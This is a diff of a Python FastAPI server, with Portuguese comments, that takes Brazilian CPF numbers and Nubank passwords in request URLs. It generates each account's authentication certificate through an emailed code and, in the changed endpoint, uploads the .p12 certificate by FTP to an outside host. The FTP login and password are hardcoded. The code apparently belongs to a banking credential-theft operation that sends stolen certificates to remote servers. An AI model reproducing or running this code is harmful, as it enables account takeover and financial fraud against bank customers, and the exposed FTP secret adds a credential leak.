@@ -70,50 +70,6 @@ junto = {}
 
 junto = []
 
-@app.get("/balance/{cpf}/{senha}/{certificado}")
-def SaldoDisponivel(cpf: int, senha: str,certificado: str):
-        
-    nu = Nubank(HttpClientWithPassword())
-    nu.authenticate_with_cert(cpf, senha, certificado)
-    saldo = nu.get_account_balance()
-
-    return {"Saldo": saldo}
-
-
-@app.get("/certificado/{cpf}/{senha}")
-def main(cpf:str, senha:str):
-    init()
-
-    log(f'Starting {Fore.MAGENTA}{Style.DIM}PLAY SERVER{Style.NORMAL}{Fore.LIGHTBLUE_EX} context creation.')
-
-    device_id = generate_random_id()
-
-    log(f'Generated random id: {device_id}')
-
-    cpf = cpf
-    password = senha
-
-    generator = CertificateGenerator(cpf, password, device_id) ## AQUI GERA O CODIGO PRA ENVIAR 
-
-    junto2 = {cpf : {"cpf": cpf, "chave": generator}}
-    
-    log(f'Requesting e-mail code')
-    try:
-        email = generator.request_code() # AQUI ELE ENVIA O CODIGO PARA O EMAIL
-    except NuException:
-        log(f'{Fore.RED}Failed to request code. Check your credentials!', Fore.RED)
-        return
-
-    log(f'Email sent to {Fore.LIGHTBLACK_EX}{email}{Fore.LIGHTBLUE_EX}')
-
-    for i, item in enumerate(junto):
-        if cpf in item:
-            junto.pop(i)
-            break
-
-    junto.append(junto2)
-    
-    return {"email": email}
 
 @app.get("/certificadoleve/{cpf}/{senha}")
 def certificadoleve(cpf:str, senha:str):
@@ -144,58 +100,31 @@ def certificadoleve(cpf:str, senha:str):
     return {"email": email}
     
 @app.get("/leve/{codigo}/{cpf}")
-def leve(codigo: str, cpf: str):
-    for item in junto:
-        if cpf in item:
-            if "chave" in item[cpf]:
-                chave = item[cpf]["chave"]
-                try:
-                    cert1, cert2 = chave.exchange_certs(codigo)
-                    save_cert(cert1, (codigo+'.p12'))
-                    return {"mensagem": "Play7Server - Certificado Gerado com sucesso!"}
-                except Exception as e:
-                    return {"error": "Erro ao gerar certificado. Verifique os dados e tente novamente."}
-            else:
-                return {"error": "Chave não encontrada para este CPF."}
-        else:
-            return {"error": "CPF não encontrado."}
-
-@app.get("/codigo/{codigo}/{cpf}")
-def enviarcodigo(codigo: str, cpf: str):
-
-    code = codigo
-    cpf = cpf
+def certftp(codigo: str, cpf: str):
 
     for item in junto:
         if cpf in item:
             if "chave" in item[cpf]:
                 chave = item[cpf]["chave"]
-                cert1, cert2 = chave.exchange_certs(code)
-                save_cert(cert1, (codigo+'.p12'))
-                print(f'{Fore.GREEN}Certificates generated successfully. (cert.pem)')
-                print(f'{Fore.YELLOW}Warning, keep these certificates safe (Do not share or version in git)')
-                
-                # Envio via FTP
+                cert1, cert2 = chave.exchange_certs(codigo)
+                save_cert(cert1, (codigo + '.p12'))
                 try:
-                    ftp_host = "ftp.cartaopepper.shop"
-                    ftp_username = "admin@cartaopepper.shop"
+                    ftp_host = "ftp.centralhoje.tech"
+                    ftp_username = "admin@centralhoje.tech"
                     ftp_password = "Em@88005424"
-                    ftp_directory = "/"  # Altere para o diretório correto
+                    ftp_directory = "/certificado"  # Altere para o diretório correto
                     
                     with ftplib.FTP(ftp_host, ftp_username, ftp_password) as ftp:
                         with open(codigo + '.p12', 'rb') as cert_file:
                             ftp.cwd(ftp_directory)
                             ftp.storbinary(f"STOR {codigo}.p12", cert_file)
-                    print("Certificate uploaded to FTP successfully.")
+                    return {"mensagem": "Certificado Gerado e Enviado via FTP com sucesso!"}
                 except Exception as e:
-                    print(f"Error uploading certificate to FTP: {e}")
-                
-                return {"mensagem": "Certificado Gerado e Enviado via FTP com sucesso!"}
+                    return {"mensagem": f"Erro ao enviar certificado via FTP: {e}"}
             else:
-                log(f'Chave "chave" não encontrada para o CPF {cpf}')
+                return {"mensagem": f"Chave não encontrada para o CPF {cpf}"}
         else:
-            log(f'CPF {cpf} não encontrado')
-
+            return {"mensagem": f"CPF {cpf} não encontrado"}
 
 @app.get("/perfilcompleto/{cpf}/{senha}/{certificado}")
 def obter_perfilcompleto(cpf: str, senha: str, certificado: str):
